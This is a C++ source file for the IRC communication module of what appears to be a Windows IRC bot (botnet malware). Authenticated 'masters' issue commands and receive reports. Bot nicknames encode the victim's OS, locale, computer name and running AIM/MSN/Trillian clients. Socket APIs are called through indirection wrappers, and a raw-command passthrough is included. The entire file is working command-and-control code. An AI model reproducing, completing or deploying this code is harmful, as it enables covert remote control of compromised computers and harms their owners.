#include "../h/includes.h"
#include "../h/functions.h"

logged_in logins[MAX_LOGINS];

IRC::IRC()
{
	hooks=0;
	clear_logins();
	connected=false;
	bconnect=true;
	cur_nick=0;

#ifndef NO_OPENSSL
	ssl_socket.Init();
#endif NO_OPENSSL
}

IRC::~IRC()
{
	if (hooks)
		delete_irc_command_hook(hooks);
}

DWORD dwLastRecv;
DWORD WINAPI PingTimeoutThread(LPVOID param)
{
	NTHREAD timeout = *((NTHREAD *)param);
	NTHREAD *timeouts = (NTHREAD *)param;
	timeouts->gotinfo = TRUE;
	IRC* irc=(IRC*)timeout.conn;

	while(1)
	{
		if (((GetTickCount()/1000)-(dwLastRecv/1000)) > PING_TIMEOUT)
		{
			irc->quit("Ping Timeout? (%d-%d)%d/%d",(GetTickCount()/1000),(dwLastRecv/1000),((GetTickCount()/1000)-(dwLastRecv/1000)),PING_TIMEOUT);
			ExitThread(0);
		}
#ifdef _DEBUG
		printf("PingTimeoutThread: %d-%d=%d>%d?%s\n",(GetTickCount()/1000),(dwLastRecv/1000),(GetTickCount()/1000)-(dwLastRecv/1000),PING_TIMEOUT,(((GetTickCount()/1000)-(dwLastRecv/1000)) > PING_TIMEOUT)?"TRUE":"FALSE");
#endif
		Sleep(PING_TIMEOUT*1000);
	}
	ExitThread(0);
}
int IRC::isend(int socket, char *data, ...)
{
	char tbuffer[IRCLINE];

	va_list argp;
	va_start(argp,data); 
	_vsnprintf(tbuffer,sizeof(tbuffer),data,argp);
#ifdef _DEBUG
	char ntbuffer[IRCLINE];
	strcpy(ntbuffer,tbuffer);
	for (unsigned int i=strlen(ntbuffer);i>strlen(ntbuffer)-2;i--)
		if (ntbuffer[i]=='\r' || ntbuffer[i]=='\n')
		{
			ntbuffer[i]=0;
		}
	printf("(out) %s\n",ntbuffer);
	DbgPrintFile("(out) %s\n",ntbuffer);
#endif
#ifndef NO_OPENSSL
	if (sinfo[curserver].usessl)
	{
		if (ssl_socket.Write(tbuffer, strlen(tbuffer))<strlen(tbuffer))
		{
			//m_bJoined=false;
			connected=false;
			fclosesocket(isock);
			isock=INVALID_SOCKET;
			clear_logins();
			return 0;
		}
		else
			return 1;
	}
	else
	{
#endif
		if (fsend(socket,tbuffer,strlen(tbuffer),0)==SOCKET_ERROR)
			return 1;
		else
			return 0;
#ifndef NO_OPENSSL
	}
#endif
}

void IRC::insert_irc_command_hook(irc_command_hook* hook, char* cmd_name, int (*function_ptr)(char*, irc_reply_data*, void*))
{
	if (hook->function)
	{
		if (!hook->next)
		{
			hook->next=new irc_command_hook;
			hook->next->function=0;
			hook->next->irc_command=0;
			hook->next->next=0;
		}
		insert_irc_command_hook(hook->next, cmd_name, function_ptr);
	}
	else
	{
		hook->function=function_ptr;
		hook->irc_command=new char[strlen(cmd_name)+1];
		strcpy(hook->irc_command, cmd_name);
	}
}

void IRC::hook_irc_command(char* cmd_name, int (*function_ptr)(char*, irc_reply_data*, void*))
{
	if (!hooks)
	{
		hooks=new irc_command_hook;
		hooks->function=0;
		hooks->irc_command=0;
		hooks->next=0;
		insert_irc_command_hook(hooks, cmd_name, function_ptr);
	}
	else
	{
		insert_irc_command_hook(hooks, cmd_name, function_ptr);
	}
}

void IRC::delete_irc_command_hook(irc_command_hook* cmd_hook)
{
	if (cmd_hook->next)
		delete_irc_command_hook(cmd_hook->next);
	if (cmd_hook->irc_command)
		delete cmd_hook->irc_command;
	delete cmd_hook;
}

int IRC::add_login(const char* nick, const char* ident, const char* host)
{
	int i;
	BOOL s=FALSE;
	for (i=0; i<MAX_LOGINS; i++)
	{
		if (logins[i].nick[0] == '\0')
		{
			strcpy(logins[i].nick, nick);
			strcpy(logins[i].ident,ident);
			strcpy(logins[i].host, host);
			s=TRUE;
			break;
		}
	}

	if (s)
		return i;
	else
		return -1;
}

int IRC::del_login(const char* nick, const char* ident, const char* host)
{
	int i;
	BOOL bs=FALSE;
	for (i=0; i<MAX_LOGINS; i++)
	{
		if (logins[i].nick[0] != '\0')
		{
			if (!strcmp(logins[i].nick,nick) && !strcmp(logins[i].ident,ident) && !strcmp(logins[i].host,host))
			{
				bs=TRUE;
				del_login(i);
				break;
			}
		}
	}
	if (bs)
		return i;
	else
		return -1;
}

void IRC::clear_logins(void)
{
	for (int i=0; i<MAX_LOGINS; i++)
	{
		ZeroMemory(logins[i].nick,sizeof(logins[i].nick));
		ZeroMemory(logins[i].ident,sizeof(logins[i].ident));
		ZeroMemory(logins[i].host,sizeof(logins[i].host));
	}
}

BOOL IRC::del_login(int i)
{
	if (logins[i].nick[0]!='\0')
	{
		ZeroMemory(logins[i].nick,sizeof(logins[i].nick));
		ZeroMemory(logins[i].ident,sizeof(logins[i].ident));
		ZeroMemory(logins[i].host,sizeof(logins[i].host));
		return TRUE;
	}
	return FALSE;
}

BOOL IRC::is_logged_in(const char* nick, const char* ident, const char* host)
{
	for (int i=0; i<MAX_LOGINS; i++)
		if (logins[i].nick[0] != '\0')
			if (!strcmp(logins[i].nick,nick) && !strcmp(logins[i].ident,ident) && !strcmp(logins[i].host,host))
				return TRUE;
	return FALSE;
}

BOOL IRC::has_master(void)
{
	for (int i=0; i<MAX_LOGINS; i++)
		if (logins[i].nick[0] != '\0')
			return TRUE;
	return FALSE;
}

int IRC::privmsg_masters(char* message, ...)
{
	if (!connected)
		return 1;
	
	int i,iret=0;
	char tbuffer[IRCLINE];
	va_list argp;
	va_start(argp,message); 
	_vsnprintf(tbuffer,sizeof(tbuffer),message,argp);
	
	for (i=0;i<MAX_LOGINS;i++)
		if (logins[i].nick[0]!='\0')
			iret+=pmsg(logins[i].nick,tbuffer);

	return iret;
}

int IRC::start(char* server, int port, char* nick, char* user, char* name, char* pass)
{
	HOSTENT* resolv;
	sockaddr_in rem;

	if (connected)
		return 1;


	isock=fsocket(AF_INET, SOCK_STREAM, IPPROTO_TCP);
	if (isock==INVALID_SOCKET)
	{
		return 1;
	}
	resolv=fgethostbyname(server);
	if (!resolv)
	{
		fclosesocket(isock);
		return 1;
	}
	memcpy(&rem.sin_addr, resolv->h_addr, 4);
	rem.sin_family=AF_INET;
	rem.sin_port=fhtons(port);

	if (fconnect(isock, (const sockaddr*)&rem, sizeof(rem))==SOCKET_ERROR)
	{
		fclosesocket(isock);
		return 1;
	}
	dwLastRecv=GetTickCount();


	clear_logins();
	dwconnected=GetTickCount();
	dwLastRecv=GetTickCount();
	connected=true;
	
	cur_nick=new char[strlen(nick)+1];
	strcpy(cur_nick, nick);

	if (pass && strcmp(pass,"")) {
		isend(isock,"PASS %s\r\n", pass);
	}
	isend(isock,"NICK %s\r\n", nick);
	isend(isock,"USER %s * 0 :%s\r\n", user, name);
	dwLastRecv=GetTickCount();

	return 0;
}

void IRC::disconnect()
{
	if (connected)
	{
#ifdef _DEBUG
		printf("Disconnected from server. (Manual)\n");
#endif // _DEBUG
		quit("Leaving");
		connected=false;
		bconnect=false;
		fshutdown(isock, 2);
		fclosesocket(isock);
	}
}

int IRC::quit(char* quit_message, ...)
{
	if (connected)
	{
		int iret=0;
		if (quit_message)
		{
			char tbuffer[IRCLINE];

			va_list argp;
			va_start(argp,quit_message); 
			_vsnprintf(tbuffer,sizeof(tbuffer),quit_message,argp);

			iret=isend(isock,"QUIT %s\r\n", tbuffer);
		}
		else
		{
			iret=isend(isock,"QUIT\r\n");
		}
		if (iret)
			return 1;
	}
	return 0;
}

int IRC::message_loop()
{
	char buffer[1024];
	int ret_len;

	if (!connected)
		return 1;

	while (1)
	{
		bool bRecvd=false;
#ifndef NO_OPENSSL
		if(sinfo[curserver].usessl)
			ret_len=ssl_socket.Read(&buffer,1023);
		else
#endif
			ret_len=frecv(isock, buffer, 1023, 0);

		if (ret_len==SOCKET_ERROR || !ret_len)
		{
			connected=false;
			return 1;
		}
		dwLastRecv=GetTickCount();
		buffer[ret_len]='\0';
		split_to_replies(buffer);
	}

	return 0;
}

void IRC::split_to_replies(char* data)
{
	char* p;

	while (p=strstr(data, "\r\n"))
	{
		*p='\0';
		parse_irc_reply(data);
		data=p+2;
	}
}

void IRC::parse_irc_reply(char* data)
{
	char* hostd;
	char* cmd;
	char* params;
	irc_reply_data hostd_tmp;

	hostd_tmp.target=0;

#ifdef _DEBUG
	char ntbuffer[IRCLINE];
	strcpy(ntbuffer,data);
	for (unsigned int i=strlen(ntbuffer);i>strlen(ntbuffer)-2;i--)
		if (ntbuffer[i]=='\r' || ntbuffer[i]=='\n')
		{
			ntbuffer[i]=0;
		}
	printf("(in)  %s\n",ntbuffer);
	DbgPrintFile("(in)  %s\n",ntbuffer);
#endif // _DEBUG
	
	if (data[0]==':')
	{
		hostd=&data[1];
		cmd=strchr(hostd, ' ');
		if (!cmd)
			return;
		*cmd='\0';
		cmd++;
		params=strchr(cmd, ' ');
		if (params)
		{
			*params='\0';
			params++;
		}
		hostd_tmp.nick=hostd;
		hostd_tmp.ident=strchr(hostd, '!');
		if (hostd_tmp.ident)
		{
			*hostd_tmp.ident='\0';
			hostd_tmp.ident++;
			hostd_tmp.host=strchr(hostd_tmp.ident, '@');
			if (hostd_tmp.host)
			{
				*hostd_tmp.host='\0';
				hostd_tmp.host++;
			}
		}

		if (!strcmp(cmd, "JOIN"))
		{
			
		}
		else if (!strcmp(cmd, "PART"))
		{
			if (is_logged_in(hostd_tmp.nick,hostd_tmp.ident,hostd_tmp.host))
				del_login(hostd_tmp.nick,hostd_tmp.ident,hostd_tmp.host);
		}
		else if (!strcmp(cmd, "QUIT"))
		{
			if (is_logged_in(hostd_tmp.nick,hostd_tmp.ident,hostd_tmp.host))
				del_login(hostd_tmp.nick,hostd_tmp.ident,hostd_tmp.host);
		}
		else if (!strcmp(cmd, "NOTICE"))
		{
			hostd_tmp.target=params;
			params=strchr(hostd_tmp.target, ' ');
			if (params)
				*params='\0';
			params++;
		}
		else if (!strcmp(cmd, "PRIVMSG"))
		{
			hostd_tmp.target=params;
			params=strchr(hostd_tmp.target, ' ');
			if (!params)
				return;
			*(params++)='\0';
		}
		else if (!strcmp(cmd, "NICK"))
		{
			if (!strcmp(hostd_tmp.nick, cur_nick))
			{
				delete [] cur_nick;
				cur_nick=new char[strlen(params)+1];
				strcpy(cur_nick, params);
			}
		}
		/* else if (!strcmp(cmd, ""))
		{
		} */
		call_hook(cmd, params, &hostd_tmp);
	}
	else
	{
		cmd=data;
		data=strchr(cmd, ' ');
		if (!data)
			return;
		*data='\0';
		params=data+1;

		if (!strcmp(cmd, "PING"))
		{
			if (!params)
				return;

			isend(isock,"PONG %s\r\n", &params[1]);
		}
		else
		{
			hostd_tmp.host=0;
			hostd_tmp.ident=0;
			hostd_tmp.nick=0;
			hostd_tmp.target=0;
			call_hook(cmd, params, &hostd_tmp);
		}
	}
}

void IRC::call_hook(char* irc_command, char* params, irc_reply_data* hostd)
{
	irc_command_hook* p;

	if (!hooks)
		return;

	p=hooks;
	while (p)
	{
		if (!strcmp(p->irc_command, irc_command))
		{
			(*(p->function))(params, hostd, this);
			p=0;
		}
		else
		{
			p=p->next;
		}
	}
}

int IRC::notice(char* target, char* message, ...)
{
	if (!connected)
		return 1;
	
	char tbuffer[IRCLINE];
	va_list argp;
	va_start(argp,message); 
	_vsnprintf(tbuffer,sizeof(tbuffer),message,argp);
	
	int iret=isend(isock,"NOTICE %s :%s\r\n", target, tbuffer);
	Sleep(FLOOD_DELAY);
	return iret;
}

int IRC::pmsg(char* target, char* message, ...)
{
	if (!connected)
		return 1;
	
	char tbuffer[(IRCLINE-(MAX_NICKLEN+10))];
	va_list argp;
	va_start(argp,message); 
	_vsnprintf(tbuffer,sizeof(tbuffer),message,argp);
	
	int iret=isend(isock,"PRIVMSG %s :%s\r\n", target, tbuffer);
	Sleep(FLOOD_DELAY);
	return iret;
}

int IRC::privmsg_filter(char* target, char *filter, char* message, ...)
{
	if (!connected)
		return 1;
	
	char tbuffer[(IRCLINE-(MAX_NICKLEN+10))];
	va_list argp;
	va_start(argp,message); 
	_vsnprintf(tbuffer,sizeof(tbuffer),message,argp);
	
	if (filter)
		if (!wildcardfit(_strlwr(filter),_strlwr(tbuffer)))
			return 1;
	int iret=isend(isock,"PRIVMSG %s :%s\r\n", target, tbuffer);
	Sleep(FLOOD_DELAY);
	return iret;
}

int IRC::join(char* channel)
{
	if (!connected)
		return 1;
	int iret=isend(isock,"JOIN %s\r\n", channel);
	return iret;
}

int IRC::join(char* channel, char* pass)
{
	if (!connected)
		return 1;
	int iret=isend(isock,"JOIN %s %s\r\n", channel, pass);
	return iret;
}

int IRC::part(char* channel)
{
	if (!connected)
		return 1;
	int iret=isend(isock,"PART %s\r\n", channel);
	return iret;
}

int IRC::raw(char* data)
{
	if (!connected)
		return 1;
	int iret=isend(isock,"%s\r\n", data);
	return iret;
}

int IRC::mode(char* channel, char* modes, char* targets)
{
	if (!connected)
		return 1;
	int iret;
	if (!targets)
		iret=isend(isock,"MODE %s %s\r\n", channel, modes);
	else
		iret=isend(isock,"MODE %s %s %s\r\n", channel, modes, targets);
	return iret;
}

int IRC::mode(char* modes)
{
	if (!connected)
		return 1;
	mode(cur_nick, modes, 0);
	return 0;
}

char *IRC::nickgen(DWORD NickType, int NickLen)
{	
	static char *rndnick;
	nicklen=NickLen;

	if (NickType==N_OS)
		rndnick=nickgen_os();

	else if (NickType==N_RNDCTY)
		rndnick=nickgen_rndcountry();

	else if (NickType==N_BOX)
		rndnick=nickgen_curbox();

	else if (NickType==N_RNDLTR)
		rndnick=nickgen_rndltr();

	else if (NickType==N_MINE)
		rndnick=nickgen_mine();

	else
		rndnick=nickgen_rndltr();
	
	return rndnick;
}

char *IRC::nickgen_rndltr(void)
{	
	static char rndnick[MAX_NICKLEN];
	ZeroMemory(rndnick,MAX_NICKLEN);
	
	for (int i=0;i<=nicklen;i++) 
		rndnick[i] = (rand()%26)+97;
	rndnick[i] = '\0';

	return rndnick;
}

char *IRC::nickgen_curbox(void)
{
	static char rndnick[MAX_NICKLEN];
	ZeroMemory(rndnick,MAX_NICKLEN);
	BOOL good=FALSE;
	
	DWORD dwcb=MAX_NICKLEN;
	fGetComputerName(rndnick,&dwcb);

	for (int j=65;j<91;j++) { if (rndnick[0] == j) good=TRUE; }
	for (int k=97;k<123;k++) { if (rndnick[0] == k) good=TRUE; }
	if (!good)
		sprintf(rndnick,"Error");
		
	return rndnick;
}

char *IRC::nickgen_rndcountry(void)
{	
	static char rndnick[MAX_NICKLEN];
	ZeroMemory(rndnick,MAX_NICKLEN);
	
	char locale[MAX_NICKLEN];
	GetLocaleInfo(LOCALE_SYSTEM_DEFAULT, LOCALE_SABBREVCTRYNAME,locale,sizeof(locale));

	sprintf(rndnick,"%s-",locale);
	
	for (int i=strlen(rndnick);i<=nicklen;i++) 
		rndnick[i]=(rand()%10)+48;

	return rndnick;
}

char *IRC::nickgen_os(void)
{	
	char *os;
	static char rndnick[MAX_NICKLEN];
	ZeroMemory(rndnick,MAX_NICKLEN);

	OSVERSIONINFO osVI;
	osVI.dwOSVersionInfoSize=sizeof(OSVERSIONINFO);
	if (GetVersionEx(&osVI)) {
			if(osVI.dwMajorVersion==4 && osVI.dwMinorVersion==0)
			{	if(osVI.dwPlatformId==VER_PLATFORM_WIN32_WINDOWS)		os="95-";
				if(osVI.dwPlatformId==VER_PLATFORM_WIN32_NT)			os="NT-"; }
			else if(osVI.dwMajorVersion==4 && osVI.dwMinorVersion==10)	os="98-";
			else if(osVI.dwMajorVersion==4 && osVI.dwMinorVersion==90)	os="ME-";
			else if(osVI.dwMajorVersion==5 && osVI.dwMinorVersion==0)	os="2K-";
			else if(osVI.dwMajorVersion==5 && osVI.dwMinorVersion==1)	os="XP-";
			else if(osVI.dwMajorVersion==5 && osVI.dwMinorVersion==2)	os="2K3-";
			else														os="WIN-";
		} else
			os="WIN-";

		sprintf(rndnick,os);
		for (int i=strlen(rndnick);i<=nicklen;i++)
			rndnick[i]=(rand()%10)+48;
	
	return rndnick;
}

char *IRC::nickgen_mine(void)
{
	static char rndnick[MAX_NICKLEN];
	ZeroMemory(rndnick,MAX_NICKLEN);

	prefixmrc=FALSE;
	prefixprv=FALSE;
	prefixdialup=FALSE;
	char *prefix=nickgen_prefix();
	
	char locale[MAX_NICKLEN];
	GetLocaleInfo(LOCALE_SYSTEM_DEFAULT, LOCALE_SABBREVCTRYNAME,locale,sizeof(locale));

	strcat(rndnick,prefix);
	strcat(rndnick,locale);
	strcat(rndnick,"|");
	
	int i=1;
	if (prefixmrc) i++;
	if (prefixprv) i++;
	if (prefixdialup) i++;
	
	char strbuf[2];
	for (i;i<REQ_NICKLEN;i++)
	{
		sprintf(strbuf,"%i",rand()%10);
		strcat(rndnick,strbuf);
	}
	strcat(rndnick,"]");

	return rndnick;
}


char *IRC::nickgen_prefix(void)
{
	static char rndnick[MAX_NICKLEN];
	ZeroMemory(rndnick,MAX_NICKLEN);
	char days[8];
	unsigned int ud=GetTickCount()/86400000;

	sprintf(rndnick,"[");

	if (FindWindow("_Oscar_StatusNotify",0))
	{
		strcat(rndnick,"A");
	}
	if (FindWindow("MSNHiddenWindowClass",0))
	{
		prefixmrc=TRUE;
		strcat(rndnick,"M");
	}
	if (FindWindow("__oxFrame.class__",0))
	{
		strcat(rndnick,"T");
	}

	sprintf(days,"%.2d",ud);
	nicktime=ud;
	strcat(rndnick,days);
	strcat(rndnick,"|");
	return rndnick;
};

int IRC::nick(char* newnick)
{
	if (!connected)
		return 1;
	int iret=isend(isock,"NICK %s\r\n", newnick);
	return iret;
}

char* IRC::current_nick()
{
	return cur_nick;
}

bool IRC::is_connected()
{
	return connected;
}

bool IRC::should_connect()
{
	return bconnect;
}

char* IRC::get_ip()
{
	SOCKADDR sa;
	int sas = sizeof(sa);
	ZeroMemory(&sa,sizeof(sa));
	fgetsockname(isock, &sa, &sas);
	sprintf(ip,"%d.%d.%d.%d",(BYTE)sa.sa_data[2], (BYTE)sa.sa_data[3], (BYTE)sa.sa_data[4], (BYTE)sa.sa_data[5]);
	return ip;
}

SOCKET IRC::get_sock(void)
{
	return isock;
}
